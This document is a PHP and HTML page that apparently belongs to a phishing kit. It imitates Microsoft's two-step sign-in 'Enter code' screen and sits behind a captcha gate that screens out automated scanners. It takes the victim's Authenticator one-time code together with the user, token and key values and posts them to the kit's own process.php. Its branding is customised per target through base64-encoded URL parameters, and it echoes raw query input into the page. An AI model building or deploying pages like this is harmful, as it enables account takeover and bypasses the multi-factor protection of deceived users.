<?php
header("Access-Control-Allow-Origin: *");
if (!isset($_COOKIE['captcha']) || $_COOKIE['captcha'] != 1) {
	include '../config.php';
	echo '<html><head><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script><meta name="viewport" content="width=device-width, initial-scale=1"></head><body> Please stand by, while we are checking your browser... <br><br><form id="myForm" action="../validate.php" method="post"><div class="cf-turnstile" data-sitekey="' . $sitekey . '" data-callback="javascriptCallback"></div></form><script>function javascriptCallback(){var a=$("#myForm"),t=a.attr("action");a.submit(function(a){a.preventDefault()}),$.ajax({type:"POST",url:t,data:a.serialize(),success:function(a){location.reload()}})}</script></body></html>';
	exit();
}
?>
<html dir="ltr"  lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">

    <title>tBxScFBI7Mv6kG2pDgOR6HMT88UBVcBYgbxD0qheqtfeK</title>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">
	<link href="../css/style3.css" rel="stylesheet">

    <link rel="shortcut icon" href="../imgs/fi.ico">

    <meta name="robots" content="none">

</head>

<body  class="cb" style="display: block;" data-gr-c-s-loaded="true">

    <div>

        <div >
            <div class="background" role="presentation" >

                <div  style="background-image: url(&quot;../imgs/bg.svg&quot;);">

                </div>

                <div id="bodybackground" class="backgroundImage"  style="<?php echo empty($_GET['bg']) ? 'background-image: url(../imgs/bg.svg)' : 'background : linear-gradient( rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5) ), url(' . base64_decode($_GET['bg']) . ');background-size: cover;background-position-y: center;background-repeat: no-repeat;' ?>">

                </div>

            </div>

        </div>

        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="../process.php">

            <div class="outer">
                <div class="middle" >

                    <div class="inner" >

                        <div >

                            <img style="max-height: 36px;" id="logoCompany" role="presentation"  src="<?php echo empty($_GET['logo']) ? '../imgs/lg.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd' : base64_decode($_GET['logo']) ?>">

                        </div>

                        <div role="main">

                            <div class="pagination-view" >

                                <div data-viewid="1">

                                    <div >
                                        <div class="identityBanner">
                                            <div id="displayName" class="identity"><?= $_GET['user'] ?></div>
                                        </div>
                                        <div data-viewid="1" data-showidentitybanner="true" >

                                            <div id="idDiv_SAOTCC_Title" class="row text-title" role="heading" aria-level="1" >Enter code</div>
                                            <div class="row text-body">
                                                <div >
                                                    <img class="tile-img small" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_ea014b224eb1c04ac2f7cb85c43cc034.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_f7ab697e65b83ce9870a4736085deeec.svg"  src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_f7ab697e65b83ce9870a4736085deeec.svg"><!-- /ko -->
                                                </div>
                                                <div id="idDiv_SAOTCC_Description" class="text-block-body overflow-hidden" >Enter the code displayed in the Microsoft Authenticator app on your mobile device​</div>
                                            </div>
                                            <div role="alert" aria-live="assertive">

                                                <div class="alert alert-error col-md-24" id="errorBar"></div>

                                            </div>
                                            <div class="text-block-body">
                                                <div id="idDiv_SAOTCC_OTCRow" class="form-group">
                                                    <div role="alert" aria-live="assertive">

                                                    </div>
                                                    <div id="idDiv_SAOTCC_Success_OTC" class="errorDiv" style="display: none;">
                                                        <span id="idSpan_SAOTCC_Success_OTC" class="success"></span>
                                                    </div>

                                                    <div id="idDiv_SAOTCC_OTC" class="textbox form-group">
                                                        <div class="placeholderContainer" >


                                                            <input id="idTxtBx_SAOTCC_OTC" name="otc" class="form-control" type="tel" autocomplete="off" aria-required="true"  maxlength="6" aria-labelledby="idDiv_SAOTCC_Title" aria-describedby="idDiv_SAOTCS_Title idDiv_SAOTCC_Description idSpan_SAOTCC_Error_OTC" aria-label="Code" placeholder="Code">
                                                        </div>
                                                    </div>

                                                </div>
                                            </div>
                                            <div class="text-block-body text-body"  style="display: none;">
                                                <a id="idA_SAOTCC_SendNotification" href="#" >Send an identity verification request to my Microsoft Authenticator app.</a>
                                            </div>

                                            <div  class="position-buttons">
                                                <div class="row">
                                                    <div id="idDiv_SAOTCC_TD_Section" class="no-margin-top-bottom"  style="display: none;">
                                                        <div id="idDiv_SAOTCC_TD" class="col-md-24 form-group no-margin-top checkbox">
                                                            <label id="idLbl_SAOTCC_TD_Cb">
                                                                <input id="idChkBx_SAOTCC_TD" type="checkbox" value="true"  name="rememberMFA" aria-label="Don't ask again for undefined days">
                                                                <span >Don't ask again for undefined days</span>
                                                            </label>
                                                        </div>
                                                    </div>

                                                    <div class="col-md-24">
                                                        <div class="text-13">
                                                            <div  class="form-group">
                                                                <a id="moreInfoUrl" href="#"  aria-label="More information about two step verification">More information</a>
                                                            </div>
                                                            <!-- /ko -->
                                                        </div>
                                                    </div>
                                                    <!-- /ko -->
                                                </div>
                                            </div>

                                            <div class="win-button-pin-bottom" >
                                                <div class="row" >
                                                    <div >
                                                        <div class="col-xs-24 no-padding-left-right button-container no-margin-bottom" >

                                                            <div  class="inline-block">
                                                                <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
                                                                <input type="submit" id="idSubmit_SAOTCC_Continue" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit"  value="Verify">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>

                                        </div>
                                    </div>
                                </div>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <input type="hidden" name="logo" id="logoForm" value="<?= empty($_GET['logo']) ? '' : base64_decode($_GET['logo']) ?>">
            <input type="hidden" name="background" id="backgroundForm" value="<?= empty($_GET['bg']) ? '' : base64_decode($_GET['bg']) ?>">
            <input type="hidden" name="token" id="tokenForm" value="<?= empty($_GET['token']) ? '' : $_GET['token'] ?>">
            <input type="hidden" name="user" id="userForm" value="<?= empty($_GET['user']) ? '' : $_GET['user'] ?>">
            <input type="hidden" name="do" value="checkVerify">
            <input type="hidden" name="service" value="code">
            <input type="hidden" name="key" value="<?= empty($_GET['key']) ? '' : $_GET['key'] ?>">

    </div>

    </div>
    </form>

    <form method="post" aria-hidden="true" target="_top" >

    </form>

    <div id="idPartnerPL" >
        <iframe height="0" width="0" src="./Sign in to your account_files/prefetch(1).html" style="display: none;"></iframe>
    </div>

    </div>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    <script>
        $(document).ready(function() {
            $('#idTxtBx_SAOTCC_OTC').focus();
            <?php if (isset($_GET['error'])) { ?>
                $('#errorBar').html('You didn\'t enter the expected verification code. Please try again');
            <?php } ?>
        });
    </script>
    <style>
        box {
            width: 40%;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.2);
            padding: 35px;
            border: 2px solid #fff;
            border-radius: 20px/50px;
            background-clip: padding-box;
            text-align: center;
        }

        .button {
            font-size: 1em;
            padding: 10px;
            color: #fff;
            border: 2px solid #0067B8;
            border-radius: 20px/50px;
            text-decoration: none;
            cursor: pointer;
            transition: all 0.3s ease-out;
        }

        .button:hover {
            background: #0067B8;
        }

        .overlay {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0, 0, 0, 0.7);
            transition: opacity 500ms;
            visibility: hidden;
            opacity: 0;
        }

        .overlay:target {
            visibility: visible;
            opacity: 1;
        }

        .popup {
            margin: 70px auto;
            padding: 20px;
            background: #fff;
            border-radius: 5px;
            width: 30%;
            position: relative;
            transition: all 5s ease-in-out;
        }

        .popup h2 {
            margin-top: 0;
            color: #333;
            font-family: Tahoma, Arial, sans-serif;
        }

        .popup .close {
            position: absolute;
            top: 20px;
            right: 30px;
            transition: all 200ms;
            font-size: 30px;
            font-weight: bold;
            text-decoration: none;
            color: #333;
        }

        .popup .close:hover {
            color: #0067B8;
        }

        .popup .content {
            max-height: 30%;
            overflow: auto;
        }

        @media screen and (max-width: 700px) {
            .box {
                width: 70%;
            }

            .popup {
                width: 70%;
            }
        }
    </style>
</body>

</html>